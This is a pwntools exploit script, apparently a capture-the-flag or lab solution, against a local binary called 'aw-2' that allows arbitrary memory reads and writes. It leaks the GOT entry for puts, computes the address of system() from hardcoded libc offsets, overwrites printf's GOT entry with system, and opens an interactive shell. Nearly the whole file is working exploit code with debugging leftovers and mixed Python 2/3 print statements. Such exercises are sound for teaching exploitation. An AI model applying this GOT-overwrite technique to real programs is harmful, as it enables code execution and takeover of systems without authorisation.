#!/usr/bin/env python

from pwn import *
import os

# set path for using system() and cat
env = { 'PATH' : '.:/bin:/usr/bin' }

p = process("./aw-2", env=env)

# open libc to get offsets of functions
e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# calcuate the offset of system()
addr_puts = e.symbols['puts']
addr_system = e.symbols['system']
#offset = addr_system - addr_puts
print('-----')
print(hex(addr_puts))
print(hex(addr_system))
# $1 = {<text variable, no debug info>} 0x7ff3c4531800 <__printf>
# $2 = {<text variable, no debug info>} 0x7ff3c454b690 <_IO_puts>
# $3 = {<text variable, no debug info>} 0x7ff3c4521390 <__libc_system>

printf_addr = 0x7ff3c4531800
system_addr = 0x7ff3c4521390
puts_addr = 0x7ff3c454b690
offset = system_addr - puts_addr
# This function will read N bytes from address A and print them
print(p.recvline())

# How many bytes do you want to read (N, in decimal)?
print(p.recvline())
p.sendline('8')

got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))
got_of_puts = p.elf.got['puts']
print("Got of puts %s" % hex(got_of_puts))

# What is the address that you want to read (A, in hexadexmial, e.g., 0xffffde01)?
print(p.recvline())
p.sendline(hex(got_of_puts))

# Reading 8 bytes from
print(p.recvline())
d=p.recvline()
print(d)
output=d.split('T')[0]
print('--output--')
print(output)
#print((u64(output)))

# How many bytes do you want to write (N, in decimal, max 128 bytes)?
print(p.recvline())
p.sendline('8')

#offset = addr_system - addr_puts
real_system = u64(output) + offset

# What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?
got_of_printf = p.elf.got['printf']
print(p.recvline())
print hex(got_of_printf)
print type(got_of_printf)
p.sendline(hex(got_of_printf))

# Please provide your input (MAX 8 bytes)
#print('\n')
#print(hex(addr_system))
#p.sendline('\n')
#print(p.recvline())
p.sendline(p64(real_system))
#p.sendline()
p.interactive()

